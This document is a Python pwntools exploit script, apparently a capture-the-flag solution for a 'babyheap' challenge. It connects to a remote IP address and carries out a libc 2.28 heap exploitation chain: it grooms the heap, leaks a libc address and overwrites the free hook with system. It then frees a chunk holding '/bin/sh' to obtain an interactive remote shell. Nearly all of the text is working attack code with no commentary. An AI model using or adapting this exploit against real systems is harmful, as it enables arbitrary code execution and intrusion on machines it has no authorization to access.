from pwn import *

r = remote("111.186.63.20", 10001)
#r = process("./babyheap", env={"LD_PRELOAD" :"./libc-2.28.so"})
r.recvuntil("Command:")

def allocate(size):
  r.sendline("1")
  r.sendline(str(size))
  r.recvuntil("Command:")

def update(index, size, content):
  r.sendline("2")
  r.sendline(str(index))
  r.sendline(str(size))
  #r.recvuntil("Content:")
  r.send(content)
  r.recvuntil("Command:")

def delete(index):
  r.sendline("3")
  r.sendline(str(index))
  r.recvuntil("Command:")

def view(index):
  r.sendline("4")
  r.sendline(str(index))
  return r.recvuntil("Command:")

si = 0x10
for i in range(16):
  print i
  allocate(0x58 - si)
  update(i, 0x58 - si, "\x00"*(0x58 - si))
for i in range(14):
  delete(i)

si = 0x30
for i in range(14):
  print i
  allocate(0x58 - si)
  update(i, 0x58 - si, "\x00"*(0x58 - si))

for i in range(1, 12, 2):
  delete(i)

allocate(0x38) #1 Trigger first consolidate
update(1, 0x38, "A"*0x38)
update(14, 0x10, "B"*0x10)

allocate(0x48) #3
allocate(0x48) #5
allocate(0x58) #7

delete(3)
delete(8)
delete(10)

allocate(0x18) #3
delete(14)

allocate(0x58) #8
print view(5)

deets = view(5).split("]: ")[1].strip("\x00")[16:24]
deet = u64(deets)

libcbase = deet - 0x1e4ca0
print hex(deet)
print hex(libcbase)

update(8, 0x58, "\x00"*72 + p64(0x51) + p64(libcbase + 0x3ebc30))

allocate(0x58) #9
update(9, 0x40, "\x00"*48 + p64(0x0) + p64(0x51))
delete(5)


targetoff = 0x1e4c55
update(8, 0x58, "\x00"*72 + p64(0x51) + p64(libcbase + targetoff))

delete(8)

allocate(0x28) #5
delete(5)

allocate(0x48) #7

print hex(libcbase + targetoff)

chainstart = 0x1e5da0 - 0x10
freehook = 0x1e4c20
system = 0x50300

allocate(0x48) #8
print hex(libcbase + chainstart)
update(8, 59+8, "\x00"*59 + p64(libcbase + chainstart))

allocate(0x58) #10
update(10, 0x30, "Z"*0x30)

for i in range(6):
    allocate(0x58) #11
    delete(11)

allocate(0x58) #11
for i in range(11):
    allocate(0x58) #14
    delete(11)
    update(8, 58, "\x00"*58)
    allocate(0x58) #11
    delete(14)
    update(8, 58, "\x00"*58)

allocate(0x58) #14
delete(11)
update(8, 58, "\x00"*58)
allocate(0x58) #11

update(14, 0x8, "/bin/sh\x00")
update(11, 0x10, "A"*8 + p64(libcbase + system))

r.sendline("3")
r.sendline("14")


r.interactive()
